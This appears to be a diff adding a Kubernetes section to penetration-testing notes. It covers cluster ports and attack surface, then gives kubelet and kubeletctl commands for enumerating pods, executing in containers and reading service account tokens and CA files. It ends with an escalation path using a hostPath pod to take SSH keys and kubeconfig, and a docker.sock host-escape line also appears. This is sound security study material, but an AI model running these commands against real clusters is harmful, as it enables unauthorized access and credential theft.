@@ -1639,3 +1639,96 @@ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt 
 
 ---
 
+
+# Kubernetes
+
+## 1. What is Kubernetes (K8s)?
+
+* Open-source container orchestration platform (originally by Google; now CNCF).
+* Manages deployment, scaling, networking, storage, and lifecycle of containers.
+* Key concepts: **Control Plane** (master) and **Worker Nodes** (minions).
+
+### 2. Core concepts
+
+* **Pod** — smallest deployable unit; may contain 1+ containers; has its own IP/hostname.
+* **Service** — stable network endpoint for Pods (load balancing, discovery).
+* **Deployment** — desired-state controller for Pods/ReplicaSets.
+* **etcd** — cluster state datastore.
+* **kube-apiserver** — central API endpoint (port `6443`).
+
+
+### 3. Control Plane components & common ports
+
+* `etcd` — `2379`, `2380`
+* `kube-apiserver` — `6443`
+* `kube-scheduler` — `10251`
+* `controller-manager` — `10252`
+* `kubelet` API — `10250` (secure), `10255` (read-only, deprecated in many setups)
+
+
+### 4. Attack surface to check (high level)
+
+* **Open/accessible kube-apiserver** (unauthenticated or weak auth).
+* **Exposed kubelet API** (unauthenticated read or exec access).
+* **ServiceAccount tokens** mounted in pods (`/var/run/secrets/...`).
+* **Over-privileged ServiceAccounts / RBAC misconfig**.
+* **HostPath volumes** or container running as root → host compromise.
+* **Image vulnerabilities** (outdated images with CVEs).
+* **Automounting of ServiceAccount token** in pods (default behavior).
+
+
+### 5. Useful reconnaissance & exploitation commands
+
+* Test API server accessibility:
+
+```bash
+curl https://<API_SERVER>:6443 -k
+# typical anonymous response: 403 Forbidden (system:anonymous)
+```
+
+* Enumerate pods via kubelet (if kubelet API open):
+
+```bash
+curl https://<NODE_IP>:10250/pods -k | jq .
+```
+
+* Use `kubeletctl` (example) to list pods and scan for RCE:
+
+```bash
+kubeletctl -i --server <NODE_IP> pods
+kubeletctl -i --server <NODE_IP> scan rce
+```
+
+* Exec into a container (if allowed via kubelet):
+
+```bash
+kubeletctl -i --server <NODE_IP> exec "id" -p <POD_NAME> -c <CONTAINER_NAME>
+# Shows uid/gid (look for uid=0 → root)
+```
+
+* Extract service account token & cluster CA from a pod:
+
+```bash
+kubeletctl --server <NODE_IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p <POD> -c <C>
+kubeletctl --server <NODE_IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p <POD> -c <C>
+```
+
+* Test permissions (once you have a token + CA):
+
+```bash
+export TOKEN=$(cat ./k8.token)
+kubectl --token=$TOKEN --certificate-authority=ca.crt --server=https://<API_SERVER>:6443 auth can-i --list
+```
+
+### 6. Typical privilege escalation path (concise)
+
+1. Discover **open kubelet** or API with weak auth.
+2. List pods → identify pod with writable mounts / root container / automount token.
+3. `exec` into pod → check `id` (root?) and look for mounted service account token.
+4. Read token & CA → use token to query API server.
+5. Use `auth can-i` to enumerate allowed actions. If allowed to `create` pods or `create` other resources, create a pod that mounts host root (`hostPath: path: /`) to access host filesystem or SSH keys.
+6. Use created pod to extract `/root/.ssh/id_rsa`, kubeconfig, or other secrets → lateral movement or persistent access.
+
+---
+
+
